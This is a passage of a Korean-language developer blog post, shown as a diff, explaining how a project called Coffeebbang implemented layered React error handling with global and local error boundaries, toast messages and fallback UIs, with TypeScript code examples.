+**apiRequest 함수에서 에러 발생**
+
+`API` 요청 과정에서 `apiRequest` 함수에서 발생하는 에러를 세분화하여 처리합니다.
+
+<img src="./images/5.png" width="400px"/>
+
+<br/>
+
+에러 분류 기준은 아래와 같습니다.
+
+- **API 에러**: 서버에서 반환된 에러 응답 → `ApiError` 객체
+- **네트워크 에러**: `TypeError` 또는 "Failed to fetch" 포함 → `NetworkError` 객체
+- **그 외**: 예상치 못한 에러 → `Error` 객체
+
+여기서 `useFetch`는 실제 `api` 요청 함수인 `apiRequest`를 래핑하는 함수이며, 컴포넌트 단에서 `api`를 요청할 때 사용되는 커스텀 훅입니다.
+
+`useFetch`를 호출하는 컴포넌트에서 핸들링하지 않기 때문에 자연스럽게 **상위 컴포넌트로 에러가 전파**됩니다.
+
+<img src="./images/6.png" width="500px"/>
+
+<br/>
+
+### 2. ErrorBoundary에서 캐치
+
+이렇게 분류된 에러는 두 계층의 `ErrorBoundary`에서 처리됩니다.
+
+앞서 봤던 `MiniGameSection`에서 에러가 발생한다면, 각 조건에 맞게 `LocalErrorBoundary` 또는 `GlobalErrorBoundary`에서 처리하게 될 것입니다.
+
+<br/>
+<img src="./images/7.png" width="300px"/>
+
+<br/>
+<br/>
+
+## 1. GlobalErrorBoundary
+
+<aside>
+
+**최상단에서 에러를 잡아주는 에러 바운더리**입니다.
+
+</aside>
+
+아래와 같이 `App`의 최상단에 적용하도록 하면, 알 수 없는 에러나 런타임 에러에 대해 내부적으로 설정한 `Fallback UI`가 렌더링되도록 설계했습니다.
+
+```tsx
+const App = () => {
+  return (
+    <ThemeProvider theme={theme}>
+      <IdentifierProvider>
+        <ParticipantsProvider>
+          <WebSocketProvider>
+            <PlayerTypeProvider>
+              <ProbabilityHistoryProvider>
+                <ToastProvider>
+                  <ModalProvider>
+                    **
+                    <GlobalErrorBoundary>
+                      **
+                      <Suspense fallback={<div>Loading...</div>}>
+                        <Outlet />
+                      </Suspense>
+                      **
+                    </GlobalErrorBoundary>
+                    **
+                  </ModalProvider>
+                </ToastProvider>
+              </ProbabilityHistoryProvider>
+            </PlayerTypeProvider>
+          </WebSocketProvider>
+        </ParticipantsProvider>
+      </IdentifierProvider>
+    </ThemeProvider>
+  );
+};
+
+export default App;
+```
+
+`App` 컴포넌트의 최상단에 배치하여, 애플리케이션 전체에서 발생하는 예상치 못한 에러를 최종적으로 캐치합니다.
+
+<br/>
+
+### 에러 처리 전략
+
+`GlobalErrorBoundary`는 에러의 종류와 상황에 따라 다음과 같이 처리합니다.
+
+**1) Toast 메시지로 처리**
+
+- `GET` 요청 에러이면서 `display: Toast`로 설정된 경우
+- `GET` 이외의 메서드(`POST`, `PATCH`, `DELETE`)에서 발생한 `API` 에러
+  - `GET` 이외의 메서드는 무조건 `Toast`를 띄우도록 했습니다. 그 이유는 보통 특정 액션에 의해서 발생하는 요청이기 때문에 굳이 재시도를 할 `UI`를 보여줄 필요가 없다고 생각했습니다.
+
+**2) Fallback UI로 처리**
+
+- 렌더링 중 발생한 예상치 못한 에러
+- 타입 에러, 참조 에러 등 알 수 없는 에러
+
+**3) Modal로 처리**
+
+- 현재는 사용하지 않지만, 향후 확장 가능
+
+그럼 여기서 **모든 에러를 처리하면 되지 않느냐?** 라고 생각할 수 있는데요.
+
+저는 해당 에러 바운더리 말고 **별도의 에러 바운더리를 하나 더 두어 에러 핸들링을 진행**해주었습니다.
+
+<br/>
+
+## 2. LocalErrorBoundary
+
+<aside>
+
+지역적인 에러를 잡기 위한 에러 바운더리입니다.
+
+</aside>
+
+### 필요한 이유?
+
+`GlobalErrorBoundary`에는 한 가지 문제점이 있는데요.
+
+바로 하위 컴포넌트에서 에러를 던지면 `GlobalErrorBoundary`를 감싸는 모든 컴포넌트에 대해서 `Fallback UI`로 대체하게 된다는 점입니다. 예를 들어, 사이드바의 작은 컴포넌트에서 에러가 발생했을 때 전체 페이지가 에러 화면으로 바뀌는 것은 자연스럽지 않습니다. 이런 경우 **에러가 발생한 부분만 Fallback UI로 대체**하는 것이 더 나은 사용자 경험을 제공한다고 생각했습니다.
+
+따라서 `LocalErrorBoundary`는 지역적으로 에러가 발생하게 될 경우, 지역 `Fallback`을 띄워주기 위해 별도로 구현하게 되었습니다. 아래와 같이 지역 `Fallback`을 주입하면, 해당 컴포넌트를 렌더링하는 부분만 `Fallback UI`를 보여주기 위함입니다.
+
+예를 들어, 아래와 같이 `LocalErrorBoundary`를 설정하고, `Fallback UI`를 주입하면
+
+<img src="./images/8.png" width="500px"/>
+
+해당 컴포넌트 내부에서 요청하는 `api` 내부에서 오류가 발생하면, 화면 전체가 `Fallback UI`로 갈아끼워지는 것이 아닌, 부분적인 `Fallback UI`가 들어가게 됩니다.
+
+<img src="./images/9.png" width="300px"/>
+
+### 에러 처리 전략
+
+`LocalErrorBoundary`는 다음과 같은 경우에 지역 `Fallback UI`를 표시합니다.
+
+**1) 지역 Fallback UI 표시**
+
+- GET 요청 에러이면서 `display: Fallback`으로 설정된 경우
+- 네트워크 에러가 발생한 경우
+
+```tsx
+<LocalErrorBoundary
+  fallback={
+    <ErrorFallback
+      message="데이터를 불러오는데 실패했습니다"
+      onRetry={refetch}
+    />
+  }
+>
+  <MiniGameList />
+</LocalErrorBoundary>
+```
+
+**2) 그 외는 상위로 `throw`**
+
+- 위 조건에 해당하지 않는 에러는 상위 `ErrorBoundary`(`GlobalErrorBoundary`)로 전파
+
+이를 통해 지역적으로 처리할 수 없는 심각한 에러는 `GlobalErrorBoundary`에서 최종적으로 처리됩니다.
+
+### 전체 구조 정리
+
+```tsx
+GlobalErrorBoundary (최상위)
+  ├─ Toast: GET 이외 메서드 에러, display: Toast인 경우
+  ├─ Fallback UI: 알 수 없는 에러, 렌더링 에러
+    │
+    └─ LocalErrorBoundary (지역)
+        ├─ 지역 Fallback: GET + display: Fallback, 네트워크 에러
+        └─ 상위로 throw: 그 외 모든 에러
+```
+
+<br/>
+<br/>
+
+# 커피빵에 적용해보기
+
+앞서 수립한 에러 핸들링 전략을 실제 코드로 구현하는 과정을 단계별로 정리했습니다.
+
+## **1. LocalErrorBoundary 구현**
+
+**1-1. 기본 사용 방법**
+
+`LocalErrorBoundary`는 특정 컴포넌트를 감싸서 **지역적인 에러를 처리**합니다.
+
+```tsx
+<LocalErrorBoundary>
+  <MiniGameSection
+    selectedMiniGames={selectedMiniGames}
+    handleMiniGameClick={handleMiniGameClick}
+  />
+</LocalErrorBoundary>
+```
+
+**1-2. `API` 요청에 `displayMode` 추가**
+
+에러가 발생했을 때 어떻게 표시할지 설정할 수 있도록 `displayMode`를 추가했습니다.
+
+**ApiRequestOptions 타입 수정**
+
+```tsx
+export type ApiRequestOptions<TData> = {
+  method?: Method;
+  headers?: Record<string, string>;
+  body?: TData;
+  retry?: {
+    count: number;
+    delay: number;
+  };
+  **displayMode?: ErrorDisplayMode; // 추가**
+};
+```
+
+**apiRequest 함수에서 displayMode 처리**
+
+```tsx
+if (!response.ok) {
+  // GET은 기본적으로 fallback, 나머지는 toast
+  const display = displayMode || (method === "GET" ? "fallback" : "toast");
+  const apiError = new ApiError(
+    response.status,
+    errorMessage,
+    errorData,
+    display
+  );
+  throw apiError;
+}
+```
+
+**1-3. LocalErrorBoundary 클래스 구현**
+
+에러 타입과 `displayMode`에 따라 적절히 처리하는 `LocalErrorBoundary`를 구현했습니다.
+
+```tsx
+import { Component, ReactNode } from "react";
+import { ApiError, NetworkError } from "@/apis/rest/error";
+import LocalErrorFallback from "./LocalErrorFallback";
+
+interface Props {
+  children: ReactNode;
+  fallback?: (error: Error, retry: () => void) => ReactNode;
+}
+
+interface State {
+  error: Error | null;
+}
+
+class LocalErrorBoundary extends Component<Props, State> {
+  constructor(props: Props) {
+    super(props);
+    this.state = { error: null };
+  }
+
+  static getDerivedStateFromError(error: Error): State {
+    // GET 요청이 아닌 API 에러는 상위로 전파
+    if (error instanceof ApiError) {
+      if (error.method !== "GET") {
+        throw error;
+      }
+
+      // displayMode가 fallback인 경우만 처리
+      if (error.displayMode === "fallback") {
+        return { error: error as ApiError };
+      }
+    }
+
+    // 네트워크 에러는 처리
+    if (error instanceof NetworkError) {
+      return { error: error as NetworkError };
+    }
+
+    // 그 외는 상위로 전파
+    throw error;
+  }
+
+  handleRetry = (): void => {
+    this.setState({ error: null });
+  };
+
+  render(): ReactNode {
+    if (this.state.error) {
+      if (this.props.fallback) {
+        return this.props.fallback(this.state.error, this.handleRetry);
+      }
+
+      return (
+        <LocalErrorFallback
+          error={this.state.error}
+          handleRetry={this.handleRetry}
+        />
+      );
+    }
+
+    return this.props.children;
+  }
+}
+
+export default LocalErrorBoundary;
+```
+
+<br/>
+
+### 구현 결과
+
+실제로 개발자 도구에서 `network` → `offline`으로 설정한 후 실행해 보았더니, 아래와 같이 지역 `Fallback` 화면이 잘 뜨는 것을 볼 수 있었습니다.
+
+<img src="./images/10.png" width="300px"/>
+
+<br/>
+
+## 2. **GlobalErrorBoundary 구현**
+
+**2-1. 클래스 컴포넌트에서 Hook 사용 문제**
+
+`GlobalErrorBoundary`에서 `Toast`를 띄우려면 `useToast hook`을 사용해야 하는데, **클래스 컴포넌트에서는 `hook`을 직접 사용할 수 없습니다**.
+
+**왜 클래스 컴포넌트에서 Hook을 사용할 수 없을까?**
+
+**1. Hook은 함수 컴포넌트의 렌더링 사이클에 의존합니다**
+
+```tsx
+// 함수 컴포넌트
+function MyComponent() {
+  const [state, setState] = useState(0);
+  // React는 함수가 호출될 때마다:
+  // 1. Hook 호출 순서를 추적
+  // 2. 해당 컴포넌트 인스턴스의 상태를 관리
+  // 3. 리렌더링 시 같은 순서로 Hook 호출
+
+  return <div>{state}</div>;
+}
+
+// 클래스 컴포넌트
+class MyComponent extends Component {
+  render() {
+    const { showToast } = useToast(); // 에러!
+    // render는 메서드이지, 함수 컴포넌트가 아님
+
+    return <div />;
+  }
+}
+```
+
+1. **Hook의 순서 보장**
+
+```tsx
+function MyComponent() {
+  const [name, setName] = useState("");
+  const [age, setAge] = useState(0);
+
+  // React는 Hook 호출 순서로 상태를 구분함
+  // 첫 번째 useState = name
+  // 두 번째 useState = age
+}
+```
+
+클래스 컴포넌트는 메서드가 여러 번, 다른 순서로 호출될 수 있어서 이 보장이 불가능합니다.
+
+<br/>
+
+**2-2. 해결 방법: Context API 직접 사용**
+
+클래스 컴포넌트에서 `Context`를 직접 사용하여 `Toast` 기능을 활용할 수 있습니다.
+
+```tsx
+import React, { Component, ReactNode } from "react";
+import { ApiError, NetworkError } from "../rest/error";
+import { ToastContext } from "@/components/@common/Toast/ToastContext";
+import GlobalErrorFallback from "./GlobalErrorFallback";
+
+interface Props {
+  children: ReactNode;
+  fallback?: ReactNode;
+}
+
+interface State {
+  error: Error | null;
+}
+
+class GlobalErrorBoundary extends Component<Props, State> {
+  // Context를 사용하기 위한 설정
+  static contextType = ToastContext;
+  declare context: React.ContextType<typeof ToastContext>;
+
+  constructor(props: Props) {
+    super(props);
+    this.state = { error: null };
+  }
+
+  static getDerivedStateFromError(error: Error): State {
+    // Toast로 처리할 에러는 상태에 저장하지 않음
+    if (error instanceof ApiError && error.displayMode === "toast") {
+      return { error: null };
+    }
+
+    if (error instanceof NetworkError && error.displayMode === "toast") {
+      return { error: null };
+    }
+
+    // Fallback UI를 보여줄 에러만 상태에 저장
+    return { error };
+  }
+
+  componentDidCatch(error: Error) {
+    // Context를 통해 Toast 표시
+    if (error instanceof ApiError && error.displayMode === "toast") {
+      this.context?.showToast({
+        type: "error",
+        message: error.message,
+      });
+    }
+
+    if (error instanceof NetworkError && error.displayMode === "toast") {
+      this.context?.showToast({
+        type: "error",
+        message: "네트워크 오류가 발생했습니다. 다시 시도해주세요.",
+      });
+    }
+  }
+
+  render(): ReactNode {
+    if (this.state.error) {
+      return (
+        this.props.fallback || <GlobalErrorFallback error={this.state.error} />
+      );
+    }
+
+    return this.props.children;
+  }
+}
+
+export default GlobalErrorBoundary;
+```
+
+**처리 흐름**
+
+1. `getDerivedStateFromError`: Toast로 처리할 에러는 `null` 반환 (UI 유지), Fallback으로 처리할 에러는 상태에 저장
+2. `componentDidCatch`: Context를 통해 Toast 표시
+3. `render`: 에러 상태에 따라 Fallback UI 또는 children 렌더링
+
+**2-3. GlobalErrorFallback 구현**
+전역 에러는 **앱 전체가 동작할 수 없는 심각한 상황**이므로, 재시도가 아닌 **메인 페이지로 이동**하도록 구현했습니다.
+
+<img src="./images/11.png" width="300px"/>
+
+<br/>
+
+**2-4. 왜 GlobalErrorFallback은 메인으로, LocalErrorFallback은 다시 시도인가?**
+
+**GlobalErrorFallback**의 상황
+
+- 앱 전체를 감싸고 있어서, 여기까지 온 에러는 **심각한 에러**
+- LocalErrorBoundary를 통과한 에러
+- 앱 전체가 동작할 수 없는 상황
+- 재시도해도 복구가 어려운 경우
+
+**LocalErrorFallback**의 상황
+
+- 특정 컴포넌트에서 발생한 **지역적인 에러**
+- 데이터 로딩 실패 등 **재시도로 해결 가능한 에러**
+- 앱의 다른 부분은 정상 동작 중
+
+<br/>
+
+# 개선 효과
+
+체계적인 에러 핸들링 시스템을 구축한 후, 커피빵 프로젝트에 여러 개선된 변화가 있었습니다.
+
+### 문제 1. API 요청 에러 핸들링 방식의 불일치 해결
+
+**Before: 제각각인 에러 처리**
+
+```tsx
+// 컴포넌트 A: 상세한 에러 처리
+useEffect(() => {
+  (async () => {
+    try {
+      setLoading(true);
+      const data = await api.get("/rooms/minigame");
+      setData(data);
+    } catch (error) {
+      if (error instanceof ApiError) {
+        setError(error.message);
+      } else if (error instanceof NetworkError) {
+        setError("네트워크 연결을 확인해주세요");
+      } else {
+        setError("알 수 없는 오류가 발생했습니다");
+      }
+    } finally {
+      setLoading(false);
+    }
+  })();
+}, []);
+
+// 컴포넌트 B: 에러 처리 누락
+useEffect(() => {
+  (async () => {
+    const menus = await api.get("/menu-categories/1/menus");
+    setMenus(menus);
+  })();
+}, []);
+```
+
+**문제점**
+
+- 어떤 컴포넌트는 15줄의 에러 처리 코드, 어떤 컴포넌트는 0줄
+- 새로운 API 호출할 때마다 "이번엔 에러를 어떻게 처리하지?"에 대한 고민 반복
+
+**After: 통합된 에러 처리**
+
+```tsx
+// 모든 컴포넌트에서 동일한 패턴
+const { data, error } = useFetch({
+  endpoint: "/rooms/minigame",
+  displayMode: "fallback", // 또는 'toast'
+});
+
+if (error) throw error;
+```
+
+**개선 효과**
+
+- 모든 API 호출이 동일한 방식으로 에러 처리
+- `displayMode` 하나만 결정하면 나머지는 자동 처리
+
+### 문제 2: 예상치 못한 에러의 노출 방지
+
+**Before: 사용자에게 그대로 노출되는 에러**
+
+```tsx
+Uncaught TypeError: Cannot read property 'map' of undefined
+    at MiniGameSection.tsx:24
+    at renderWithHooks
+    ...
+```
+
+**문제점**
+
+- 렌더링 중 발생한 에러를 처리하지 못함
+- 사용자가 개발자용 에러 메시지를 그대로 봄
+- "이 서비스 괜찮은 건가?" 하는 불신 발생
+
+**After: ErrorBoundary로 안전하게 처리**
+
+```tsx
+<GlobalErrorBoundary>
+  <App />
+</GlobalErrorBoundary>
+```
+
+**개선 효과**
+
+- 모든 예상치 못한 에러를 `ErrorBoundary`가 캐치
+- 사용자에게는 친화적인 에러 화면 표시
+- 개발자는 콘솔에서 상세한 에러 정보 확인 가능
+
+<br/>
+
+### DX 향상
+
+에러 핸들링 시스템을 구축하면서 예상하지 못했던 부분이 하나 있었습니다. 바로 개발자 경험의 개선이었습니다.
+
+1. **반복 작업에서 해방**
+
+이전에는 새로운 API를 호출할 때마다 똑같은 고민을 반복해야 했습니다. "에러는 어떻게 처리하지?", "네트워크 에러는 따로 처리해야 하나?" 같은 질문들이 그 예시입니다.
+
+하지만 이제는 `displayMode`만 결정하면 나머지는 에러 바운더리에서 처리해주게 되었습니다. 따라서 반복되는 작업을 줄이고, 팀원들은 비즈니스 로직에 집중할 수 있게 되었습니다.
+
+2. **심리적 안정감**
+
+기존에는 “혹시 내가 에러 처리를 빠뜨린 거 아닐까?”, “배포 후 에러가 나면 어쩌지?”와 같은 불안감이 있었습니다. 하지만 `ErrorBoundary`라는 최종 안전망이 있고, 팀 전체가 일관된 패턴을 사용한다는 확신이 생겼기 때문에 심리적 안정감이 올라가게 되었습니다.
+
+<br/>
+
+# **학습한 점**
+
+이번 에러 핸들링 시스템을 구축하면서 여러 가지를 배울 수 있었습니다.
+
+---
+
+**1. ErrorBoundary의 한계와 비동기 처리**
+
+ErrorBoundary는 렌더링 단계에서 발생한 에러만 캐치할 수 있다는 중요한 제약이 있었습니다. 비동기 작업 내부에서 던진 에러는 캐치되지 않기 때문에, 에러를 상태로 관리한 후 렌더링 시점에 `throw`하는 패턴이 필요했습니다.
+
+**2. 클래스 컴포넌트와 Hook의 제약**
+
+ErrorBoundary를 구현하려면 클래스 컴포넌트를 사용해야 하는데, 클래스 컴포넌트에서는 Hook을 직접 사용할 수 없었습니다. 이를 해결하기 위해 `Context API`를 직접 활용하는 방법을 배웠습니다. React 팀이 함수형 `ErrorBoundary`를 제공하지 않는 이유와 그 한계를 이해할 수 있었습니다.
+
+**3. 에러의 계층적 처리**
+
+모든 에러를 한 곳에서 처리하는 것보다, **에러의 성격과 범위에 따라 계층적으로 처리**하는 것이 더 효과적이라는 것을 깨달았습니다. 지역적인 데이터 로딩 실패는 해당 영역만 Fallback UI로 대체하고, 심각한 에러는 전역에서 처리하는 구조가 사용자 경험 측면에서 훨씬 자연스러웠습니다.
+
+**4. 사용자 관점에서의 에러 처리**
+
+단순히 에러를 잡는 것이 아니라, **사용자가 무엇을 원할지 고민**하는 것이 중요했습니다. 데이터 조회 실패 시에는 재시도 버튼을, 액션 실패 시에는 원인을 알려주는 Toast를, 심각한 에러 시에는 안전한 곳으로 안내하는 것처럼 상황에 맞는 UX를 제공하는 것이 중요하다는 것을 느낄 수 있었습니다.
+
+<br/>
+
+# 아쉬운 점
+
+현재는 재시도 버튼만 고정으로 제공하는 수준이지만, 더 고차원적인 복구 전략이 필요할 것 같습니다.
+
+또한 개발 환경과 프로덕션 환경의 구분이 없어서, 모든 환경에서 동일한 에러 메세지를 보여주지만, 개발 환경에서는 상세한 스택 트레이스를 보고 싶을 수 있습니다. 따라서 이를 구분하는 작업이 필요할 것 같습니다.
+
+<br/>
+
+# 마무리
+
+완벽한 서비스는 에러가 발생하지 않는 서비스가 아니라, **에러가 발생해도 사용자가 당황하지 않고 다음 행동을 취할 수 있는 서비스**입니다.
+
+이번 에러 핸들링 시스템 구축을 통해 **커피빵**은 더욱 안정적인 서비스가 되었고, 에러를 추적하고 개선할 수 있는 환경을 마련했습니다. 무엇보다 **사용자가 신뢰할 수 있는 서비스**를 만드는 데 한 걸음 더 나아갔다는 점에서 의미가 있었습니다.
+
+에러는 피할 수 없지만, 어떻게 대응하느냐는 우리가 선택할 수 있습니다. 여러분의 프로젝트에서도 체계적인 에러 핸들링을 통해 더 나은 사용자 경험을 제공하시길 바랍니다.
